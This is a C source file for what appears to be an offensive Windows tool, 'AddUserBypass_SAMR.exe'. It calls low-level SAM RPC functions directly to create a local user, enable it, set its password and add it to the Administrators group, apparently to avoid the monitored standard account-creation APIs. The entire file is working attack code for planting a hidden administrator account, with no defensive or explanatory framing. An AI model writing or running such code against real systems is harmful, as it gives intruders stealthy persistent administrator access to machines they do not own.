#include <stdio.h>
#include <Windows.h>
#include "samlib.h"

#pragma comment(lib, "samlib.lib")
#pragma comment(lib, "ntdll.lib")

void AddUser(wchar_t* uName, wchar_t* uPass)
{
	DWORD* pRid;
	DWORD* pUse;
	DWORD USE = 0;
	ULONG grantAccess;
	ULONG relativeId;
	DWORD* adminRID;
	PSID userSID = NULL;
	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
	DWORD i, domainEnumerationContext = 0, domainCountReturned;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer = NULL, pEnumGroupBuffer = NULL;
	PSID builtinDomainSid = 0, accountDomainSid = 0;
	SAMPR_HANDLE hServerHandle = NULL, hDomainHandle = NULL, hUserHandle = NULL;
	
	SAMPR_USER_ALL_INFORMATION userAllInfo = { 0 };
	NTSTATUS enumGroupStatus;
	DWORD groupEnumerationContext = 0;
	DWORD groupCountReturned;
	UNICODE_STRING adminGroup;
	
	SAMPR_HANDLE hAdminGroup;

	UNICODE_STRING userName;
	UNICODE_STRING password;
	UNICODE_STRING uBuiltin;
	UNICODE_STRING serverName;

	// init server, username, password
	RtlInitUnicodeString(&uBuiltin, L"Builtin");
	RtlInitUnicodeString(&userName, uName);
	RtlInitUnicodeString(&password, uPass);
	RtlInitUnicodeString(&serverName, L"localhost");


	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);

	if (NT_SUCCESS(status))
	{
		do
		{
			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountReturned);
			for (i = 0; i < domainCountReturned; i++)
			{
				// Get Builtin Domain SID & Account Domain SID
				if (RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
					SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &builtinDomainSid);
				else 
					SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &accountDomainSid);
			}

			
		} while (enumDomainStatus == STATUS_MORE_ENTRIES);

		status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP | DOMAIN_CREATE_USER, accountDomainSid, &hDomainHandle);
		if (NT_SUCCESS(status))
		{
			// Create user in Account Domain
			status = SamCreateUser2InDomain(hDomainHandle, &userName, USER_NORMAL_ACCOUNT, USER_ALL_ACCESS | DELETE | WRITE_DAC, &hUserHandle, &grantAccess, &relativeId);
			if (NT_SUCCESS(status))
			{
				
				wprintf(L"[*] SamCreateUser2InDomain success. User RID: %d\n", relativeId);
				userAllInfo.NtPasswordPresent = TRUE;
				userAllInfo.WhichFields |= USER_ALL_NTPASSWORDPRESENT;

				// Clear the UF_ACCOUNTDISABLE to enable account
				userAllInfo.UserAccountControl &= 0xFFFFFFFE;
				userAllInfo.UserAccountControl |= USER_NORMAL_ACCOUNT;
				userAllInfo.WhichFields |= USER_ALL_USERACCOUNTCONTROL;
				RtlInitUnicodeString(&userAllInfo.NtOwfPassword, password.Buffer);

				// Set password and userAccountControl
				status = SamSetInformationUser(hUserHandle, UserAllInformation, &userAllInfo);
				if (NT_SUCCESS(status))
				{
					wprintf(L"[*] SamSetInformationUser success.\n");
				}
				else wprintf(L"[!] SamSetInformationUser error 0x%08X\n", status);
			}
			else wprintf(L"[!] SamCreateUser2InDomain error 0x%08X\n", status);

		}
		else wprintf(L"[!] SamOpenDomain error. 0x%0X8\n", status);

		status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, builtinDomainSid, &hDomainHandle);
		if (NT_SUCCESS(status))
		{
			RtlInitUnicodeString(&adminGroup, L"administrators");
			
			// Lookup Administrators in Builtin Domain
			status = SamLookupNamesInDomain(hDomainHandle, 1, &adminGroup, &adminRID, &USE);
			if (NT_SUCCESS(status))
			{

				status = SamOpenAlias(hDomainHandle, ALIAS_ADD_MEMBER, *adminRID, &hAdminGroup);
				if (NT_SUCCESS(status))
				{
					SamRidToSid(hUserHandle, relativeId, &userSID);

					// Add user to Administrators
					status = SamAddMemberToAlias(hAdminGroup, userSID);
					if (NT_SUCCESS(status))
					{
						wprintf(L"[*] SamAddMemberToAlias success.\n");
					}
					else wprintf(L"[!] AddMemberToAlias error 0x%08X\n", status);
				}
				else wprintf(L"[!] SamOpenAlias error 0x%08X\n", status);
			}
			else wprintf(L"[!] SamLookupNamesInDomain error 0x%08X\n", status);
						
		}
		
	}
	else wprintf(L"[!] Samconnect error\n");

	SamCloseHandle(hUserHandle);
	SamCloseHandle(hDomainHandle);
	SamCloseHandle(hServerHandle);
	SamFreeMemory(pEnumDomainBuffer);
	SamFreeMemory(pEnumGroupBuffer);
	
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc == 3)
	{
		AddUser(argv[1], argv[2]);
	}
	else wprintf(L"Usage: AddUserBypass_SAMR.exe <username> <password>");
	

	return 0;
}